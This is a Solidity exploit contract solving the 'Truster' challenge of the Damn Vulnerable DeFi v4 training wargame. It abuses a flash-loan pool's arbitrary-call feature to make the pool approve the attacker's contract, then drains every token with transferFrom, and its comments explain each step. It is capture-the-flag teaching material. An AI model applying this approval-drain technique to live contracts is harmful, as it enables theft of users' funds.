// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/**
 * @title TrusterExploit
 * @dev Exploit contract for the Truster challenge
 *
 * This contract exploits a vulnerability in the TrusterLenderPool where the flash loan
 * mechanism allows arbitrary calls to be made on behalf of the pool contract.
 *
 * Attack Vector:
 * 1. The pool's flashLoan function accepts a target address and calldata
 * 2. It executes target.functionCall(data) from the pool's context
 * 3. We can make the pool approve our contract to spend its tokens
 * 4. Then we can drain all tokens using transferFrom
 */
contract TrusterExploit {
    TrusterLenderPool pool;
    DamnValuableToken token;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    /**
     * @dev Initialize the exploit with pool and token addresses
     * @param _pool Address of the TrusterLenderPool contract
     * @param _token Address of the DamnValuableToken contract
     */
    constructor(address _pool, address _token) payable {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    /**
     * @dev Execute the exploit to drain all tokens from the pool
     * @param _recovery Address to send the drained tokens to
     *
     * Attack Steps:
     * 1. Create calldata to approve this contract to spend pool's tokens
     * 2. Use flashLoan to execute the approval on behalf of the pool
     * 3. Transfer all tokens from pool to recovery address using the approval
     *
     * The flash loan doesn't actually lend any tokens (amount = 0), but it
     * executes our malicious approval call, giving us permission to drain the pool.
     */
    function exploit(address _recovery) external {
        // Step 1: Encode the approval call that will be executed by the pool
        bytes memory flashLoanFunctionCallData = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            TOKENS_IN_POOL
        );

        // Step 2: Use flashLoan to make the pool approve our contract
        // The pool will execute: token.approve(address(this), TOKENS_IN_POOL)
        pool.flashLoan(
            0, // amount: 0 (we don't actually need to borrow)
            address(this), // borrower: irrelevant since amount is 0
            address(token), // target: the token contract
            flashLoanFunctionCallData // data: approval call
        );

        // Step 3: Now that we have approval, drain all tokens directly to recovery
        token.transferFrom(address(pool), _recovery, TOKENS_IN_POOL);
    }
}
